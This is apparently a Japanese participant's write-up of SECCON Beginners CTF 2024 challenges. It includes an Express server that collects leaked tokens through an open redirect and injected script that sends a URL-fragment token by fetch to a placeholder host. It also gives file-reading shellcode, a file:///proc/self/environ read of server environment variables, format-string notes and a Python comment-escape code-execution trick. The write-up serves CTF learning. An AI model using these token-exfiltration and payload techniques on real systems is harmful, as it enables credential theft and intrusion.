---
title: SECCON Beginners CTF 2024 参加記
tags:
  - 'seccon'
private: false
updated_at: ''
id: null
organization_url_name: null
slide: false
ignorePublish: false
---
# はじめに

SECCON Begginers CTF 2024に参加したので、自分が解いた問題の解法を共有します。

記事書くのは初めてで、乱雑な箇所が多いかもしれませんが、この記事を見てくださった方の学びに少しでも貢献できればと思い書いています。

結果はチーム「Sabiyuku Wabisabi」でScoreは684ptで、117(/962)位でした。

# 解法

## wooorker

### 解法

まず、GETリクエストを入力してその詳細をターミナルに出力するサーバを構築する。
以下、サーバのコードの例

```javascript:server.js
const express = require('express');
const app = express();
const port = 3000;

// JSON形式のリクエストボディをパースするミドルウェア
app.use(express.json());

// すべてのリクエストに対して200ステータスコードを返すミドルウェア
app.use((req, res, next) => {
  console.log(`Received ${req.method} request for ${req.url}`);
  console.log('Headers:', req.headers);
  console.log('Query:', req.query);
  if (req.body) {
    console.log('Body:', req.body);
  }
  res.status(200).send('OK');
});

// サーバを起動
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
```
これと適当なpackage.jsonをレポジトリに保存して、デプロイする。
デプロイにはRenderなどの無料サーバでデプロイする。
ngrokやgithubのcodespacesを用いてデプロイした場合には、サーバにアクセスする前に確認画面が入るのでうまくいかない。

デプロイしたサーバのURLを`https://example.com/`として、脆弱性報告botに`login?next=https://example.com/`と入力する。すると、サーバ上のターミナルからリクエストの内容を確認すると、
`Received GET request for /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzE4NDUzNzAyLCJleHAiOjE3MTg0NTczMDJ9.LfQhIqEBemmwxSZfSCedaqpKa-SlT9yPOYsyj56M5V8`のように表示されている。(このtokenはすでに有効期限を過ぎている。)
このtokenを使って`https://wooorker.beginners.seccon.games/?token=******`
にアクセスするとフラグを取得できる。

### フラグ

ctf4b{0p3n_r3d1r3c7_m4k35_70k3n_l34k3d}

## wooorker2

### 解法

woooker1の時に構築したサーバを少し改変する。
前回はクエリパラメータにtokenを含んだ状態でリクエストが
送られていたが、今回はフラグメントにtokenが含まれている。ですので、リクエストを受け取るサーバにおいてはtokenの情報にアクセスできない。クライアントサイドでJavascriptを実行してtokenをサーバ側に再送する処理を行う。サーバのコードは以下のようになる。
デプロイしたサーバのURLは`https://example.com/`としている。

```javascript:server.js
const express = require('express');
const app = express();
const port = 3000;

app.get('/', (req, res) => {
  const script = `
    <script>
      const fragment = window.location.hash.substring(1);
      const params = new URLSearchParams(fragment);
      const tokenValue = params.get('token');
      fetch('https://example.com/token?value=' + tokenValue)
        .then(() => {
          document.body.innerHTML = '<h1>Token sent to server</h1>';
        })
        .catch((error) => {
          document.body.innerHTML = '<h1>Error sending token to server</h1>';
          console.error('Error:', error);
        });
    </script>
  `;
  res.send(script);
});

app.get('/token', (req, res) => {
  const tokenValue = req.query.value;
  console.log('Received token:', tokenValue);
  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
```

これによりサーバ上で以下のようにtokenが受け取れる(このtokenはすでに有効期限を過ぎている。)
`Received token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzE4NDcyODI4LCJleHAiOjE3MTg0NzY0Mjh9.yAxwfpt9eU6jJ2E4YofnvRS07FSGSCCRQQB9nmZ161w`

このtokenを使って`https://wooorker2.beginners.seccon.games/?token=******`
にアクセスするとフラグを取得できる。

### フラグ

ctf4b{x55_50m371m35_m4k35_w0rk3r_vuln3r4bl3}

## assemble

`file.txt`という文字のファイルを開くときに、以下の２点を要確認

1. リトルエンディアンで格納する必要があるので、txt.elifをutf-8でバイト列に直す必要がある。
[バイト列と文字列の変換にはこのサイトが便利](https://dencode.com/ja/)
2. 終端文字を表すバイト`\x00`をファイルの名前の終わりに入れる必要がある。


以下が作成したアセンブリコード。rax, rdi, rsi, rdxには適当な数字を入れることでsyscallの処理内容が変わる。
```assembly
mov rax, 0x00
push rax
mov rax, 0x7478742e67616c66
push rax
mov rax, 2
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall

mov rdi, rax
mov rax, 0
mov rsi, rsp
mov rdx, 52
syscall

mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, 52
syscall
```

### フラグ

ctf4b{gre4t_j0b_y0u_h4ve_m4stered_4ssemb1y_14ngu4ge}

## Welcome

Discord上のannouncementsチャンネルに公開されているフラグを入力するだけです。

# 粘ったが解けなかった問題
## pure and easy
Format String Attackを使って、
exit関数をwin関数に置き換えればいいのかなと思いました。
実装しましたがうまくいきませんでした...

# 学び
## wooorker2

1. `url=javascript: alert('XSS')`のように
URLへjavascriptを埋め込無ことができる。

2. また、URLのフラグメント(#より後の部分)はクライアント側では参照できるが、サーバ側では参照できないという仕様

3. [Render](https://render.com/)を用いて無料で簡単にデプロイできる。

4. ユーザが指定する他のサイトにアクセスするクローラによりtokenが盗まれる危険性があることがわかった。

## ssrforfli
プログラム中でユーザ入力のアドレスにcurlコマンドを行う危険性がわかった。`curl 'file://localhost/proc/self/environ/'`にアクセスすることでサーバの環境変数が読み込まれることがある。

## pure and easy
```c
puts(buf)
```
上のようなC言語におけるputs関数でそのまま変数を出力する危険性。フォーマット文字列攻撃の対象になる。"%x %x %x %x"のような文字列でスタックを参照される。xをnに変えることでスタックを書き換えられる。

## simple overwrite
変数として確保した領域以上にread関数で読み込むと変数の領域外に書き込めてしまう。

## commentator
pythonにおいて#の後に
```python
# coding:raw_unicode_escape 
#\u000aprint("evil code")
#\u000aprint("\u265F" * 10)
```
のように書くと、コメントの中なのにprint関数を実行できる。

# 感想
SECCONの問題は、謎解きをしている感覚で楽しめました。どの問題も学びが多く非常に面白かったです。
各問題は、何箇所かひらめきや知識が必要な箇所があり全て解けた時にその問題が解けるような問題になっていることが多いと感じました。自分が知らないことでもチームメンバーが知っていた場合すぐに解ける箇所もありました(その逆もありました。)。ですので、解いていく時の方針として、問題を解いていて、ある程度時間が経ったらチームメンバーと相談するのが大事な気がしました。
